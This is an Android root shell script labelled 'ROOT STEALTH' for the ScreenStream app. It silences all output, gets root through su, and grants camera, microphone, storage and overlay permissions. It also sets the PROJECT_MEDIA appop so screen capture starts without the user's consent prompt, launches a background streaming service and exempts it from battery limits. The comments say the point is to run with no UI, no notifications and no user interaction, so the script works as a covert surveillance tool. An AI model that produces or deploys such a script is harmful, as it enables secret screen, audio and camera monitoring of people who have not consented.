#!/system/bin/sh
# ScreenStream - ROOT STEALTH Start Script
# Requires ROOT access to bypass screen capture permission dialog
# Runs completely silently with no UI, no notifications, no user interaction

PACKAGE="info.dvkr.screenstream"

# Silent execution - redirect all output to /dev/null
exec >/dev/null 2>&1

# Check if running as root
if [ "$(id -u)" != "0" ]; then
    # Try to re-run with su
    su -c "$0" "$@"
    exit $?
fi

# Grant all permissions silently (root required)
pm grant $PACKAGE android.permission.SYSTEM_ALERT_WINDOW
pm grant $PACKAGE android.permission.POST_NOTIFICATIONS
pm grant $PACKAGE android.permission.RECORD_AUDIO
pm grant $PACKAGE android.permission.CAMERA
pm grant $PACKAGE android.permission.WRITE_EXTERNAL_STORAGE
pm grant $PACKAGE android.permission.READ_EXTERNAL_STORAGE

# Grant MediaProjection permission (screen capture) without user dialog
# This is the key to stealth operation - normally requires user to click "Start now"
appops set $PACKAGE PROJECT_MEDIA allow

# Start the streaming service directly in background (no UI)
# Choose one of the following:

# For Local/MJPEG streaming:
am startservice -n $PACKAGE/info.dvkr.screenstream.mjpeg.MjpegModuleService

# For RTSP streaming (uncomment if preferred):
# am startservice -n $PACKAGE/info.dvkr.screenstream.rtsp.RtspModuleService

# Keep the service alive even if app is killed
am set-standby-bucket $PACKAGE active

# Disable battery optimization for the app (prevents Android from killing it)
dumpsys deviceidle whitelist +$PACKAGE

exit 0
